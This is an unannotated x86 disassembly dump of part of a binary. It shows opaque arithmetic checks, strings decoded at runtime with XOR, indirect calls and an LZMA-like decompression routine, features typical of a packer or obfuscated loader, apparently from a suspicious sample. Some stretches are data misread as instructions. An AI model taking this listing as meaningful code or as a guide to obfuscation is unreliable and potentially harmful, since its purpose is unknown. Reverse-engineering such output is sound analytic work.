  423eb1:	jmp    0x423ec3
  423eb6:	mov    edx,DWORD PTR ds:0x428e97
  423ebc:	inc    edx
  423ebd:	mov    DWORD PTR ds:0x428e97,edx
  423ec3:	cmp    DWORD PTR ds:0x428e97,0x10
  423eca:	jae    0x423f0a
  423ed0:	cmp    DWORD PTR ds:0x428e97,0x8
  423ed7:	jg     0x423f0a
  423edd:	jmp    0x423eeb
  423ee2:	push   DWORD PTR [ebp-0x20]
  423ee5:	call   DWORD PTR ds:0x42a9fb
  423eeb:	cmp    DWORD PTR ds:0x428e97,0x7
  423ef2:	jne    0x423f05
  423ef8:	mov    edx,DWORD PTR ds:0x428e97
  423efe:	inc    edx
  423eff:	mov    DWORD PTR ds:0x428e97,edx
  423f05:	jmp    0x423eb6
  423f0a:	mov    DWORD PTR [ebp-0x8],esi
  423f0d:	and    DWORD PTR ds:0x428e67,0x0
  423f17:	jmp    0x423f29
  423f1c:	mov    edx,DWORD PTR ds:0x428e67
  423f22:	inc    edx
  423f23:	mov    DWORD PTR ds:0x428e67,edx
  423f29:	cmp    DWORD PTR ds:0x428e67,0x1a
  423f30:	jae    0x423f78
  423f36:	cmp    DWORD PTR ds:0x428e67,0x4
  423f3d:	jle    0x423f78
  423f43:	jmp    0x423f59
  423f48:	push   DWORD PTR [ebp-0x18]
  423f4b:	push   0x428e67
  423f50:	push   DWORD PTR [ebp-0x18]
  423f53:	call   DWORD PTR ds:0x42a9ff
  423f59:	cmp    DWORD PTR ds:0x428e67,0x3
  423f60:	jne    0x423f73
  423f66:	mov    edx,DWORD PTR ds:0x428e67
  423f6c:	inc    edx
  423f6d:	mov    DWORD PTR ds:0x428e67,edx
  423f73:	jmp    0x423f1c
  423f78:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  423f7f:	push   edi
  423f80:	adc    DWORD PTR ds:0x428e87,0x34d1
  423f8a:	mov    eax,eax
  423f8c:	mov    eax,DWORD PTR [ebp-0x4]
  423f8f:	movzx  edx,BYTE PTR ds:0x428e97
  423f96:	add    DWORD PTR ds:0x428ecf,edx
  423f9c:	mov    edi,DWORD PTR [ebp-0x8]
  423f9f:	mov    ecx,DWORD PTR ds:0x429777
  423fa5:	mov    ecx,DWORD PTR [ecx]
  423fa7:	sub    DWORD PTR ds:0x428ecb,ecx
  423fad:	mov    ecx,0x75108af
  423fb2:	xor    eax,ecx
  423fb4:	xor    edi,ecx
  423fb6:	mov    edx,0x3272f6
  423fbb:	add    edi,edx
  423fbd:	add    eax,edx
  423fbf:	imul   eax,edi
  423fc2:	mov    edi,DWORD PTR [ebp+0xc]
  423fc5:	cmp    edi,eax
  423fc7:	je     0x42401c
  423fcd:	mov    DWORD PTR [ebp-0xc],esi
  423fd0:	mov    eax,DWORD PTR [ebp-0xc]
  423fd3:	mov    esi,DWORD PTR [ebp+0xc]
  423fd6:	xor    eax,ecx
  423fd8:	lea    eax,[eax*8+0x1939828]
  423fdf:	mov    eax,DWORD PTR [esi+eax*1]
  423fe2:	mov    DWORD PTR [ebp+0xc],eax
  423fe5:	mov    eax,DWORD PTR [ebp-0x4]
  423fe8:	mov    esi,DWORD PTR [ebp-0x8]
  423feb:	xor    eax,ecx
  423fed:	xor    esi,ecx
  423fef:	add    esi,edx
  423ff1:	add    eax,edx
  423ff3:	imul   eax,esi
  423ff6:	mov    esi,DWORD PTR [ebp+0xc]
  423ff9:	cmp    esi,eax
  423ffb:	je     0x42401c
  424001:	mov    eax,DWORD PTR [ebp-0x4]
  424004:	xor    eax,ecx
  424006:	mov    ecx,DWORD PTR [ebp+0xc]
  424009:	add    eax,edx
  42400b:	imul   eax,ecx
  42400e:	add    eax,DWORD PTR [ebp+0x8]
  424011:	mov    DWORD PTR [ebp+0xc],eax
  424014:	mov    eax,DWORD PTR [ebp+0xc]
  424017:	jmp    0x42402d
  42401c:	mov    eax,DWORD PTR [ebp-0x4]
  42401f:	mov    esi,DWORD PTR [ebp-0x8]
  424022:	xor    esi,ecx
  424024:	xor    eax,ecx
  424026:	add    esi,edx
  424028:	add    eax,edx
  42402a:	imul   eax,esi
  42402d:	pop    edi
  42402e:	pop    esi
  42402f:	leave  
  424030:	ret    0x8
	...
  424043:	add    BYTE PTR [ebp-0x44],al
  424046:	mov    edi,0x4d
  42404b:	add    BYTE PTR [edx],al
  42404d:	add    BYTE PTR [eax],al
  42404f:	add    BYTE PTR [ecx+0x0],al
  424052:	add    BYTE PTR [eax],al
  424054:	pusha  
  424055:	inc    eax
  424056:	add    al,BYTE PTR [eax]
  424058:	pusha  
  424059:	xor    al,0x2
  42405b:	add    BYTE PTR [eax],al
  42405d:	add    BYTE PTR [eax],al
  42405f:	add    BYTE PTR [edx+0x53],dl
  424062:	inc    esp
  424063:	push   ebx
  424064:	fdiv   DWORD PTR [edi+0x63]
  424067:	inc    ecx
  424068:	add    ch,dl
  42406a:	push   edi
  42406b:	inc    ebp
  42406c:	test   eax,0x97845b3d
  424071:	push   ebx
  424072:	pushf  
  424073:	nop
  424074:	add    DWORD PTR [eax],eax
  424076:	add    BYTE PTR [eax],al
  424078:	inc    ebx
  424079:	cmp    bl,BYTE PTR [esi+eax*2+0x6f]
  42407d:	ins    BYTE PTR es:[edi],dx
  42407e:	fs gs jb 0x4240a2
  424082:	outs   dx,DWORD PTR ds:[esi]
  424083:	data16 and BYTE PTR [edi+0x6f],dl
  424087:	jb     0x4240f4
  424089:	imul   ebp,DWORD PTR [esi+0x67],0x6f725020
  424090:	push   0x65
  424092:	arpl   WORD PTR [esp+ebx*2+0x50],si
  424096:	jb     0x424107
  424098:	push   0x65
  42409a:	arpl   WORD PTR [esp+edx*2+0x65],si
  42409e:	jae    0x424114
  4240a0:	add    BYTE PTR [ebx-0x137e13ab],cl
  4240a6:	or     BYTE PTR [ecx],al
  4240a8:	add    BYTE PTR [eax],al
  4240aa:	push   ebx
  4240ab:	mov    eax,ebx
  4240ad:	xchg   ecx,eax
  4240ae:	mov    eax,DWORD PTR [ebp+0x8]
  4240b1:	cmp    eax,0xf89c85a5
  4240b6:	jne    0x424542
  4240bc:	mov    eax,DWORD PTR [ebp+0xc]
  4240bf:	cmp    eax,0xf89c85a4
  4240c4:	jne    0x424542
  4240ca:	mov    eax,DWORD PTR [ebp+0x24]
  4240cd:	mov    DWORD PTR [ebp-0x4],eax
  4240d0:	mov    eax,DWORD PTR [ebp-0x4]
  4240d3:	mov    eax,DWORD PTR [eax+0x1d8]
  4240d9:	mov    eax,DWORD PTR [eax]
  4240db:	mov    eax,DWORD PTR [eax]
  4240dd:	mov    DWORD PTR [ebp-0x8],eax
  4240e0:	mov    BYTE PTR [ebp-0x18],0x1c
  4240e4:	mov    BYTE PTR [ebp-0x17],0x1f
  4240e8:	mov    BYTE PTR [ebp-0x16],0x1a
  4240ec:	mov    BYTE PTR [ebp-0x15],0x50
  4240f0:	mov    BYTE PTR [ebp-0x14],0x51
  4240f4:	mov    BYTE PTR [ebp-0x13],0x83
  4240f8:	mov    BYTE PTR [ebp-0x20],0xe
  4240fc:	mov    BYTE PTR [ebp-0x1f],0x10
  424100:	mov    BYTE PTR [ebp-0x1e],0x1e
  424104:	mov    BYTE PTR [ebp-0x1d],0x11
  424108:	mov    BYTE PTR [ebp-0x1c],0x50
  42410c:	mov    BYTE PTR [ebp-0x1b],0x51
  424110:	mov    BYTE PTR [ebp-0x1a],0x83
  424114:	mov    BYTE PTR [ebp-0x28],0x10
  424118:	mov    BYTE PTR [ebp-0x27],0x1b
  42411c:	mov    BYTE PTR [ebp-0x26],0x17
  424120:	mov    BYTE PTR [ebp-0x25],0xc
  424124:	mov    BYTE PTR [ebp-0x24],0x22
  424128:	mov    BYTE PTR [ebp-0x23],0x13
  42412c:	mov    BYTE PTR [ebp-0x22],0x1a
  424130:	mov    BYTE PTR [ebp-0x21],0x83
  424134:	xor    ecx,ecx
  424136:	lea    eax,[ebp+ecx*1-0x18]
  42413a:	movzx  edx,BYTE PTR [eax]
  42413d:	xor    edx,0x7f
  424140:	add    edx,0x4
  424143:	inc    ecx
  424144:	mov    BYTE PTR [eax],dl
  424146:	cmp    ecx,0x6
  424149:	jb     0x424136
  42414b:	xor    ecx,ecx
  42414d:	lea    eax,[ebp+ecx*1-0x20]
  424151:	movzx  edx,BYTE PTR [eax]
  424154:	xor    edx,0x7f
  424157:	add    edx,0x4
  42415a:	inc    ecx
  42415b:	mov    BYTE PTR [eax],dl
  42415d:	cmp    ecx,0x7
  424160:	jb     0x42414d
  424162:	xor    ecx,ecx
  424164:	lea    eax,[ebp+ecx*1-0x28]
  424168:	movzx  edx,BYTE PTR [eax]
  42416b:	xor    edx,0x7f
  42416e:	add    edx,0x4
  424171:	inc    ecx
  424172:	mov    BYTE PTR [eax],dl
  424174:	cmp    ecx,0x8
  424177:	jb     0x424164
  424179:	lea    eax,[ebp-0x2c]
  42417c:	mov    DWORD PTR [ebp-0x8],eax
  42417f:	mov    ecx,DWORD PTR [ebp-0x8]
  424182:	mov    eax,0x7113fccf
  424187:	push   esi
  424188:	mov    DWORD PTR [ecx],eax
  42418a:	mov    ecx,DWORD PTR [ebp-0x2c]
  42418d:	mov    esi,0x4e38
  424192:	push   edi
  424193:	lea    edi,[esi-0x6]
  424196:	mov    ebx,0x3272f6
  42419b:	cmp    ecx,eax
  42419d:	jne    0x42426e
  4241a3:	lea    eax,[esi+0x3f]
  4241a6:	mov    WORD PTR [ebp-0x78],ax
  4241aa:	mov    eax,esi
  4241ac:	mov    WORD PTR [ebp-0x76],ax
  4241b0:	add    eax,0x45
  4241b3:	mov    WORD PTR [ebp-0x74],ax
  4241b7:	lea    eax,[esi+0x6]
  4241ba:	mov    WORD PTR [ebp-0x72],ax
  4241be:	add    eax,0x41
  4241c1:	mov    WORD PTR [ebp-0x70],ax
  4241c5:	mov    eax,edi
  4241c7:	mov    WORD PTR [ebp-0x6e],ax
  4241cb:	mov    eax,0x4f94
  4241d0:	mov    WORD PTR [ebp-0x6c],ax
  4241d4:	lea    eax,[esi-0x7]
  4241d7:	mov    WORD PTR [ebp-0x6a],ax
  4241db:	add    eax,0x30
  4241de:	mov    WORD PTR [ebp-0x68],ax
  4241e2:	lea    eax,[esi-0x3]
  4241e5:	mov    WORD PTR [ebp-0x66],ax
  4241e9:	mov    eax,esi
  4241eb:	mov    WORD PTR [ebp-0x64],ax
  4241ef:	add    eax,0xfffffffc
  4241f2:	mov    WORD PTR [ebp-0x62],ax
  4241f6:	mov    eax,0x443
  4241fb:	mov    WORD PTR [ebp-0x60],ax
  4241ff:	mov    eax,0x5672
  424204:	mov    WORD PTR [ebp-0x5e],ax
  424208:	mov    eax,0x6112
  42420d:	mov    WORD PTR [ebp-0x5c],ax
  424211:	mov    eax,0xf1e0
  424216:	mov    WORD PTR [ebp-0x5a],ax
  42421a:	mov    eax,edi
  42421c:	mov    WORD PTR [ebp-0x58],ax
  424220:	lea    eax,[ebp-0xe0]
  424226:	push   eax
  424227:	mov    eax,DWORD PTR [ebp+0xc]
  42422a:	xor    eax,0x75108af
  42422f:	add    eax,ebx
  424231:	push   eax
  424232:	lea    eax,[ebp-0x78]
  424235:	push   eax
  424236:	mov    eax,DWORD PTR [ebp-0x4]
  424239:	mov    eax,DWORD PTR [eax+0x198]
  42423f:	mov    DWORD PTR [ebp-0xe0],0x1
  424249:	mov    DWORD PTR [ebp-0xdc],0xffff
  424253:	push   DWORD PTR [eax]
  424255:	mov    eax,DWORD PTR [ebp+0x10]
  424258:	call   eax
  42425a:	mov    DWORD PTR [ebp-0x8],eax
  42425d:	mov    eax,DWORD PTR [ebp-0x8]
  424260:	test   eax,eax
  424262:	je     0x42426e
  424264:	xor    DWORD PTR ds:0xe041cc1,0x9f170bd0
  42426e:	mov    eax,DWORD PTR [ebp-0x4]
  424271:	mov    ecx,DWORD PTR [eax+0x18c]
  424277:	xor    eax,eax
  424279:	cmp    DWORD PTR [ecx],eax
  42427b:	jne    0x4244b2
  424281:	mov    ecx,DWORD PTR [ebp-0x4]
  424284:	mov    ecx,DWORD PTR [ecx+0x17c]
  42428a:	mov    DWORD PTR [ecx],eax
  42428c:	mov    ecx,DWORD PTR [ebp-0x4]
  42428f:	mov    ecx,DWORD PTR [ecx+0x180]
  424295:	mov    DWORD PTR [ecx],eax
  424297:	mov    eax,0x4e6d
  42429c:	mov    WORD PTR [ebp-0x9c],ax
  4242a3:	mov    eax,esi
  4242a5:	mov    WORD PTR [ebp-0x9a],ax
  4242ac:	mov    eax,0x4e7d
  4242b1:	mov    WORD PTR [ebp-0x98],ax
  4242b8:	add    eax,0xffffffc0
  4242bb:	mov    WORD PTR [ebp-0x96],ax
  4242c2:	mov    eax,0x4f88
  4242c7:	mov    WORD PTR [ebp-0x94],ax
  4242ce:	mov    eax,0x4e3c
  4242d3:	mov    WORD PTR [ebp-0x92],ax
  4242da:	mov    eax,esi
  4242dc:	mov    WORD PTR [ebp-0x8c],ax
  4242e3:	mov    eax,0x4e31
  4242e8:	mov    WORD PTR [ebp-0x8a],ax
  4242ef:	mov    eax,0x99fd
  4242f4:	mov    WORD PTR [ebp-0x88],ax
  4242fb:	mov    eax,0x8d6c
  424300:	mov    WORD PTR [ebp-0x86],ax
  424307:	mov    eax,0xd66f
  42430c:	mov    WORD PTR [ebp-0x84],ax
  424313:	mov    BYTE PTR [ebp-0x10],0x10
  424317:	mov    eax,0xd783
  42431c:	mov    WORD PTR [ebp-0x82],ax
  424323:	mov    BYTE PTR [ebp-0xf],0x1b
  424327:	mov    eax,0x2782
  42432c:	mov    BYTE PTR [ebp-0xe],0x17
  424330:	mov    WORD PTR [ebp-0x80],ax
  424334:	mov    BYTE PTR [ebp-0xd],0xc
  424338:	mov    eax,0x4782
  42433d:	mov    BYTE PTR [ebp-0xc],0x22
  424341:	mov    WORD PTR [ebp-0x7e],ax
  424345:	mov    eax,0x4e33
  42434a:	mov    BYTE PTR [ebp-0xb],0x13
  42434e:	push   0x8
  424350:	mov    BYTE PTR [ebp-0xa],0x1a
  424354:	mov    WORD PTR [ebp-0x7c],ax
  424358:	mov    BYTE PTR [ebp-0x9],0x83
  42435c:	mov    DWORD PTR [ebp-0x90],0x4e324e61
  424366:	lea    eax,[ebp-0x10]
  424369:	pop    edi
  42436a:	movzx  ecx,BYTE PTR [eax]
  42436d:	xor    ecx,0x7f
  424370:	add    ecx,0x4
  424373:	mov    BYTE PTR [eax],cl
  424375:	inc    eax
  424376:	dec    edi
  424377:	jne    0x42436a
  424379:	mov    DWORD PTR [ebp-0xe0],0x1
  424383:	lea    eax,[ebp-0x10]
  424386:	mov    DWORD PTR [ebp-0xdc],eax
  42438c:	mov    ecx,0x4e60
  424391:	mov    eax,ecx
  424393:	mov    WORD PTR [ebp-0x40],ax
  424397:	add    eax,0xb
  42439a:	mov    edx,eax
  42439c:	mov    WORD PTR [ebp-0x3e],dx
  4243a0:	mov    edx,0x4f93
  4243a5:	mov    WORD PTR [ebp-0x3c],dx
  4243a9:	add    edx,0xfffffff8
  4243ac:	mov    WORD PTR [ebp-0x3a],dx
  4243b0:	mov    edx,0x4f89
  4243b5:	mov    WORD PTR [ebp-0x38],dx
  4243b9:	add    edx,0x5
  4243bc:	mov    WORD PTR [ebp-0x36],dx
  4243c0:	mov    edx,0x4f87
  4243c5:	mov    WORD PTR [ebp-0x34],dx
  4243c9:	mov    WORD PTR [ebp-0x32],cx
  4243cd:	mov    ecx,esi
  4243cf:	mov    WORD PTR [ebp-0x30],cx
  4243d3:	lea    ecx,[edx-0x7]
  4243d6:	mov    edx,ecx
  4243d8:	mov    WORD PTR [ebp-0x54],dx
  4243dc:	mov    edx,eax
  4243de:	mov    WORD PTR [ebp-0x52],dx
  4243e2:	mov    edx,0x4e73
  4243e7:	mov    WORD PTR [ebp-0x50],dx
  4243eb:	mov    WORD PTR [ebp-0x4e],ax
  4243ef:	lea    eax,[edx-0xa]
  4243f2:	mov    WORD PTR [ebp-0x4c],ax
  4243f6:	add    eax,0x5
  4243f9:	mov    WORD PTR [ebp-0x4a],ax
  4243fd:	lea    eax,[edx-0xc]
  424400:	mov    WORD PTR [ebp-0x48],ax
  424404:	mov    WORD PTR [ebp-0x46],cx
  424408:	mov    WORD PTR [ebp-0x44],si
  42440c:	mov    ecx,DWORD PTR [ebp+0x8]
  42440f:	movzx  edx,WORD PTR [ebp-0x54]
  424413:	mov    eax,0x75108af
  424418:	xor    ecx,eax
  42441a:	add    ecx,ebx
  42441c:	xor    ecx,edx
  42441e:	mov    WORD PTR [ebp-0x54],cx
  424422:	mov    ecx,DWORD PTR [ebp+0x8]
  424425:	xor    ecx,eax
  424427:	movzx  eax,WORD PTR [ebp-0x40]
  42442b:	add    ecx,ebx
  42442d:	xor    ecx,eax
  42442f:	xor    eax,eax
  424431:	mov    WORD PTR [ebp-0x40],cx
  424435:	mov    WORD PTR [ebp-0xf4],ax
  42443c:	mov    WORD PTR [ebp-0x108],ax
  424443:	mov    edi,DWORD PTR [ebp+0x24]
  424446:	lea    eax,[ebp-0xf4]
  42444c:	lea    edx,[ebp-0x54]
  42444f:	mov    DWORD PTR [ebp-0xe0],0x2
  424459:	mov    DWORD PTR [ebp-0xdc],eax
  42445f:	call   0x426ea1
  424464:	mov    ecx,DWORD PTR [ebp+0x8]
  424467:	mov    DWORD PTR [ebp-0xd8],eax
  42446d:	mov    eax,0x75108af
  424472:	xor    ecx,eax
  424474:	add    ecx,ebx
  424476:	je     0x424495
  424478:	lea    ecx,[ebp-0xe0]
  42447e:	push   ecx
  42447f:	mov    ecx,DWORD PTR [ebp+0xc]
  424482:	xor    ecx,eax
  424484:	add    ecx,ebx
  424486:	push   ecx
  424487:	lea    eax,[ebp-0x9c]
  42448d:	push   eax
  42448e:	mov    eax,DWORD PTR [ebp+0x10]
  424491:	push   0x0
  424493:	call   eax
  424495:	mov    edi,DWORD PTR [ebp+0x24]
  424498:	lea    eax,[ebp-0x108]
  42449e:	lea    edx,[ebp-0x40]
  4244a1:	mov    DWORD PTR [ebp-0xdc],eax
  4244a7:	call   0x426ea1
  4244ac:	mov    DWORD PTR [ebp-0xd8],eax
  4244b2:	mov    eax,DWORD PTR [ebp+0x14]
  4244b5:	push   DWORD PTR [ebp-0x4]
  4244b8:	push   DWORD PTR [ebp+0x20]
  4244bb:	push   DWORD PTR [ebp+0x1c]
  4244be:	push   DWORD PTR [ebp+0x18]
  4244c1:	push   DWORD PTR [ebp+0x10]
  4244c4:	push   DWORD PTR [ebp+0x8]
  4244c7:	push   DWORD PTR [ebp+0xc]
  4244ca:	call   0x425742
  4244cf:	test   eax,eax
  4244d1:	je     0x424518
  4244d3:	add    DWORD PTR [ebp-0x4],eax
  4244d6:	push   DWORD PTR [ebp-0x4]
  4244d9:	lea    esi,[ebp+0x4]
  4244dc:	call   0x424930
  4244e1:	mov    eax,DWORD PTR [ebp-0x4]
  4244e4:	mov    eax,DWORD PTR [eax+0x1c8]
  4244ea:	mov    eax,DWORD PTR [eax]
  4244ec:	xor    eax,0x75108af
  4244f1:	add    eax,ebx
  4244f3:	mov    eax,DWORD PTR [ebp-0x4]
  4244f6:	jne    0x42450e
  4244f8:	mov    ecx,DWORD PTR [ebp-0x4]
  4244fb:	mov    ecx,DWORD PTR [ecx+0x1cc]
  424501:	push   DWORD PTR [ecx]
  424503:	mov    eax,DWORD PTR [eax+0x1e0]
  424509:	call   DWORD PTR [eax+0x28]
  42450c:	jmp    0x424518
  42450e:	mov    eax,DWORD PTR [eax+0x17c]
  424514:	mov    eax,DWORD PTR [eax]
  424516:	add    DWORD PTR [esi],eax
  424518:	mov    eax,DWORD PTR [ebp-0x4]
  42451b:	mov    eax,DWORD PTR [eax+0x1dc]
  424521:	dec    DWORD PTR [eax]
  424523:	mov    ecx,DWORD PTR [ebp-0x4]
  424526:	mov    ecx,DWORD PTR [ecx+0x1d8]
  42452c:	mov    eax,DWORD PTR [eax]
  42452e:	lea    eax,[ecx+eax*4]
  424531:	mov    ecx,DWORD PTR [ebp-0x4]
  424534:	mov    ecx,DWORD PTR [ecx+0x17c]
  42453a:	mov    eax,DWORD PTR [eax]
  42453c:	mov    ecx,DWORD PTR [ecx]
  42453e:	add    DWORD PTR [eax],ecx
  424540:	pop    edi
  424541:	pop    esi
  424542:	pop    ebx
  424543:	leave  
  424544:	ret    0x20
  424547:	push   edi
  424548:	push   esi
  424549:	push   ebx
  42454a:	push   ebp
  42454b:	mov    ebp,esp
  42454d:	mov    eax,DWORD PTR [ebp+0x24]
  424550:	add    DWORD PTR [ebp+0x28],eax
  424553:	push   eax
  424554:	cld    
  424555:	mov    esi,DWORD PTR [ebp+0x18]
  424558:	add    DWORD PTR [ebp+0x1c],esi
  42455b:	push   esi
  42455c:	mov    esi,DWORD PTR [ebp+0x14]
  42455f:	lods   eax,DWORD PTR ds:[esi]
  424560:	xchg   edx,eax
  424561:	push   edx
  424562:	mov    cl,BYTE PTR [esi-0x2]
  424565:	or     eax,0xffffffff
  424568:	shl    eax,cl
  42456a:	not    eax
  42456c:	push   eax
  42456d:	mov    cl,dh
  42456f:	or     eax,0xffffffff
  424572:	shl    eax,cl
  424574:	not    eax
  424576:	push   eax
  424577:	add    cl,dl
  424579:	mov    edi,esi
  42457b:	sub    esp,0xc
  42457e:	sub    eax,eax
  424580:	inc    eax
  424581:	push   eax
  424582:	push   eax
  424583:	push   eax
  424584:	push   eax
  424585:	push   eax
  424586:	push   edi
  424587:	sub    esi,esi
  424589:	push   esi
  42458a:	or     ebx,0xffffffff
  42458d:	mov    eax,0x300
  424592:	shl    eax,cl
  424594:	lea    ecx,[eax+0x736]
  42459a:	mov    eax,0x4000400
  42459f:	shr    ecx,1
  4245a1:	rep stos DWORD PTR es:[edi],eax
  4245a3:	push   0x5
  4245a5:	pop    ecx
  4245a6:	call   0x424891
  4245ab:	loop   0x4245a6
  4245ad:	lea    esi,[esi]
  4245af:	lea    edi,[edi]
  4245b1:	mov    edi,DWORD PTR [ebp-0x4]
  4245b4:	mov    eax,DWORD PTR [ebp-0x10]
  4245b7:	sub    edi,DWORD PTR [ebp+0x24]
  4245ba:	and    eax,edi
  4245bc:	mov    DWORD PTR [ebp-0x18],eax
  4245bf:	mov    al,0x0
  4245c1:	call   0x4248a9
  4245c6:	jne    0x424661
  4245cc:	mov    cl,BYTE PTR [ebp-0xc]
  4245cf:	and    edi,DWORD PTR [ebp-0x14]
  4245d2:	shl    edi,cl
  4245d4:	sub    cl,0x8
  4245d7:	neg    cl
  4245d9:	shr    esi,cl
  4245db:	pop    eax
  4245dc:	add    edi,esi
  4245de:	pop    esi
  4245df:	lea    edi,[edi+edi*2]
  4245e2:	shl    edi,0x8
  4245e5:	cmp    al,0x7
  4245e7:	pop    edx
  4245e8:	lea    ecx,[esi+edi*2+0xe6c]
  4245ef:	push   ecx
  4245f0:	push   esi
  4245f1:	mov    esi,0x100
  4245f6:	push   eax
  4245f7:	mov    al,0x1
  4245f9:	jb     0x42462f
  4245fb:	mov    edi,DWORD PTR [ebp-0x4]
  4245fe:	sub    edi,DWORD PTR [ebp-0x24]
  424601:	movzx  edi,BYTE PTR [edi]
  424604:	mov    ebp,DWORD PTR [ebp-0x34]
  424607:	shl    edi,1
  424609:	mov    ecx,esi
  42460b:	and    esi,edi
  42460d:	add    ecx,esi
  42460f:	lea    ebp,[ebp+ecx*2+0x0]
  424613:	call   0x4248c8
  424618:	mov    ecx,eax
  42461a:	shr    esi,0x8
  42461d:	and    ecx,0x1
  424620:	cmp    esi,ecx
  424622:	mov    esi,0x100
  424627:	jne    0x424637
  424629:	cmp    eax,esi
  42462b:	jb     0x424604
  42462d:	jmp    0x424643
  42462f:	mov    ebp,DWORD PTR [ebp-0x34]
  424632:	call   0x4248c8
  424637:	inc    eax
  424638:	inc    esi
  424639:	sub    eax,0x1
  42463c:	sub    esi,0x1
  42463f:	cmp    eax,esi
  424641:	jb     0x42462f
  424643:	pop    edx
  424644:	inc    edx
  424645:	cmp    edx,0x5
  424648:	dec    edx
  424649:	mov    ecx,edx
  42464b:	jb     0x42465c
  42464d:	inc    edx
  42464e:	cmp    edx,0xb
  424651:	dec    edx
  424652:	mov    cl,0x4
  424654:	dec    cl
  424656:	jb     0x42465c
  424658:	mov    cl,0x7
  42465a:	dec    cl
  42465c:	sub    edx,ecx
  42465e:	push   edx
  42465f:	jmp    0x4246b0
  424661:	mov    al,0xc1
  424663:	dec    al
  424665:	call   0x4248b9
  42466a:	jne    0x424680
  42466c:	pop    eax
  42466d:	pop    edi
  42466e:	pop    edx
  42466f:	pop    ecx
  424670:	pop    edx
  424671:	pop    ecx
  424672:	push   DWORD PTR [esp]
  424675:	push   ecx
  424676:	push   edx
  424677:	mov    edx,0x664
  42467c:	mov    cl,0x0
  42467e:	jmp    0x4246f3
  424680:	mov    al,0xcd
  424682:	dec    al
  424684:	call   0x4248b9
  424689:	jne    0x4246b9
  42468b:	mov    al,0xf1
  42468d:	dec    al
  42468f:	call   0x4248a9
  424694:	jne    0x4246e9
  424696:	pop    eax
  424697:	cmp    al,0x7
  424699:	mov    al,0x9
  42469b:	jb     0x42469f
  42469d:	mov    al,0xb
  42469f:	push   eax
  4246a0:	mov    esi,DWORD PTR [ebp-0x4]
  4246a3:	sub    esi,DWORD PTR [ebp-0x24]
  4246a6:	cmp    esi,DWORD PTR [ebp+0x24]
  4246a9:	jb     0x424880
  4246af:	lods   al,BYTE PTR ds:[esi]
  4246b0:	mov    edi,DWORD PTR [ebp-0x4]
  4246b3:	stos   BYTE PTR es:[edi],al
  4246b4:	jmp    0x424847
  4246b9:	mov    al,0xd8
  4246bb:	call   0x4248b9
  4246c0:	mov    esi,DWORD PTR [ebp-0x28]
  4246c3:	je     0x4246e0
  4246c5:	mov    al,0xe4
  4246c7:	call   0x4248b9
  4246cc:	mov    esi,DWORD PTR [ebp-0x2c]
  4246cf:	je     0x4246da
  4246d1:	mov    esi,DWORD PTR [ebp-0x30]
  4246d4:	mov    ecx,DWORD PTR [ebp-0x2c]
  4246d7:	mov    DWORD PTR [ebp-0x30],ecx
  4246da:	mov    ecx,DWORD PTR [ebp-0x28]
  4246dd:	mov    DWORD PTR [ebp-0x2c],ecx
  4246e0:	mov    ecx,DWORD PTR [ebp-0x24]
  4246e3:	mov    DWORD PTR [ebp-0x28],ecx
  4246e6:	mov    DWORD PTR [ebp-0x24],esi
  4246e9:	pop    eax
  4246ea:	pop    edi
  4246eb:	pop    ecx
  4246ec:	mov    edx,0xa68
  4246f1:	mov    cl,0x8
  4246f3:	add    edx,edi
  4246f5:	push   edx
  4246f6:	push   edi
  4246f7:	cmp    al,0x7
  4246f9:	mov    al,cl
  4246fb:	jb     0x4246ff
  4246fd:	add    al,0x3
  4246ff:	push   eax
  424700:	mov    ebp,DWORD PTR [ebp-0x34]
  424703:	call   0x4248c6
  424708:	jne    0x42471e
  42470a:	mov    eax,DWORD PTR [ebp-0x18]
  42470d:	mov    edi,DWORD PTR [ebp-0x34]
  424710:	shl    eax,0x3
  424713:	sub    ecx,ecx
  424715:	push   0x8
  424717:	pop    esi
  424718:	lea    edi,[edi+eax*2+0x4]
  42471c:	jmp    0x424753
  42471e:	mov    ebp,DWORD PTR [ebp-0x34]
  424721:	add    ebp,0x2
  424724:	call   0x4248c6
  424729:	jne    0x424743
  42472b:	mov    eax,DWORD PTR [ebp-0x18]
  42472e:	mov    edi,DWORD PTR [ebp-0x34]
  424731:	shl    eax,0x3
  424734:	push   0x8
  424736:	pop    ecx
  424737:	push   0x8
  424739:	pop    esi
  42473a:	lea    edi,[edi+eax*2+0x104]
  424741:	jmp    0x424753
  424743:	mov    edi,0x204
  424748:	add    edi,DWORD PTR [ebp-0x34]
  42474b:	push   0x10
  42474d:	pop    ecx
  42474e:	mov    esi,0x100
  424753:	mov    DWORD PTR [ebp-0x1c],ecx
  424756:	sub    eax,eax
  424758:	inc    eax
  424759:	mov    ebp,edi
  42475b:	call   0x4248c8
  424760:	mov    ecx,eax
  424762:	sub    ecx,esi
  424764:	jb     0x424759
  424766:	add    DWORD PTR [ebp-0x1c],ecx
  424769:	cmp    DWORD PTR [ebp-0x3c],0x4
  42476d:	jae    0x424823
  424773:	add    DWORD PTR [ebp-0x3c],0x7
  424777:	mov    ecx,DWORD PTR [ebp-0x1c]
  42477a:	cmp    ecx,0x4
  42477d:	jb     0x424782
  42477f:	push   0x3
  424781:	pop    ecx
  424782:	mov    edi,DWORD PTR [ebp-0x38]
  424785:	shl    ecx,0x6
  424788:	sub    eax,eax
  42478a:	inc    eax
  42478b:	push   0x40
  42478d:	pop    esi
  42478e:	lea    edi,[edi+ecx*2+0x360]
  424795:	mov    ebp,edi
  424797:	call   0x4248c8
  42479c:	mov    ecx,eax
  42479e:	sub    ecx,esi
  4247a0:	jb     0x424795
  4247a2:	mov    DWORD PTR [ebp-0x18],ecx
  4247a5:	mov    DWORD PTR [ebp-0x24],ecx
  4247a8:	cmp    ecx,0x4
  4247ab:	jb     0x424820
  4247ad:	mov    esi,ecx
  4247af:	and    DWORD PTR [ebp-0x24],0x1
  4247b3:	shr    esi,1
  4247b5:	or     DWORD PTR [ebp-0x24],0x2
  4247b9:	dec    esi
  4247ba:	cmp    ecx,0xe
  4247bd:	jae    0x4247d8
  4247bf:	mov    eax,0x2af
  4247c4:	sub    eax,ecx
  4247c6:	mov    ecx,esi
  4247c8:	shl    BYTE PTR [ebp-0x24],cl
  4247cb:	add    eax,DWORD PTR [ebp-0x24]
  4247ce:	shl    eax,1
  4247d0:	add    eax,DWORD PTR [ebp-0x38]
  4247d3:	mov    DWORD PTR [ebp-0x34],eax
  4247d6:	jmp    0x424805
  4247d8:	sub    esi,0x4
  4247db:	call   0x424885
  4247e0:	shr    ebx,1
  4247e2:	shl    DWORD PTR [ebp-0x24],1
